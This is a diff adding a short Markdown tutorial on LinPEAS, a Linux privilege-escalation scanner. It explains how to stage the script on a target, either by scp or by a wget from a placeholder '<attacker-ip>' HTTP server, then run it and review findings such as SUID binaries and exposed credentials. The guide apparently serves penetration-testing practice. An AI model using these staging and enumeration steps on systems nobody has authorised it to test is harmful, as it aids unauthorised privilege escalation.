@@ -1,0 +1,55 @@
+# How to Use LinPEAS
+
+LinPEAS is a Linux Privilege Escalation Awesome Script designed to automate the process of identifying potential privilege escalation paths on Linux systems.
+
+---
+
+## Setup
+
+1. Ensure that the target Linux machine has a writable directory to upload files.
+
+2. Transfer LinPEAS to the target machine:
+   a. If you have SSH access:
+      scp ~/Desktop/tools/PEASS-ng/linpeas.sh user@target:/tmp
+
+   b. Alternatively, use a web server to host LinPEAS:
+      - Start a Python HTTP server on your attacker machine:
+        python3 -m http.server 8080
+      - Download LinPEAS on the target:
+        wget http://<attacker-ip>:8080/PEASS-ng/linpeas.sh -O /tmp/linpeas.sh
+
+---
+
+## Usage
+
+1. Make LinPEAS executable on the target machine:
+   chmod +x /tmp/linpeas.sh
+
+2. Run LinPEAS to scan the system for privilege escalation vectors:
+   /tmp/linpeas.sh
+
+3. Capture the output for later review:
+   /tmp/linpeas.sh | tee linpeas-output.txt
+
+---
+
+## Tips
+
+- Run LinPEAS as a **low-privilege user** to identify potential privilege escalation paths.
+- Review the output carefully, paying attention to:
+  - SUID binaries
+  - Misconfigurations
+  - Writable directories/files owned by root
+  - Credentials in configuration files
+- Use the recommendations from LinPEAS output to guide your next steps.
+
+---
+
+## Additional Resources
+
+- LinPEAS GitHub: https://github.com/carlospolop/PEASS-ng
+- Detailed documentation and updates are available on the GitHub page.
+
+---
+
+Happy Hacking!
